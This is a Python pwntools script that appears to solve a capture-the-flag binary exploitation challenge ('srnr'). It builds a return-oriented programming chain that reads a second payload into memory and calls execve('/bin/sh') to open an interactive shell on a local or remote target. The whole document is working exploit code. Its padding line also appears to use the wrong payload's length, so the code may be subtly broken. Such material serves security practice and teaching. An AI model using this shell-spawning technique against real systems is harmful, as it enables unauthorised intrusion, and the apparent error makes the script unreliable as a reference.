# https://ptr-yudai.hatenablog.com/entry/2019/08/17/061600#Pwn-280pts-Stop-ROPn-Roll
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


exe = './srnr'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

call_Pr12 = 0x400800
'''
mov rdx, r15
mov rsi, r14
mov edi, r13d
call qword [r12 + rbx*8]
'''
pop_rdi = 0x400823
pop_rsi_r15 = 0x00400821
pop_rbx_rbp_r12_r13_r14_r15 = 0x40081a
binSh = 0x400c49
syscall = 0x400703
bss_section = 0x00602020+0x30

io = start()
payload = flat({
	17: [
		pop_rdi,
		0x0,
		pop_rsi_r15,
		bss_section,
		0xdeeddeed,
		elf.plt.read,
		pop_rbx_rbp_r12_r13_r14_r15,
		0x0,
		0x1,
		bss_section,				# r12 --> func
		bss_section+8,				# r13 -> edi
		0x0,						# r14 -> rsi
		0x0, 						# r15 -> rdx
		call_Pr12,
	]
})
io.sendline(payload)
sleep(1)
payload2 = p64(syscall) + b"/bin/sh\x00"
payload2 += b"A" *(59 - len(payload))	# execve
io.sendline(payload2)
io.interactive()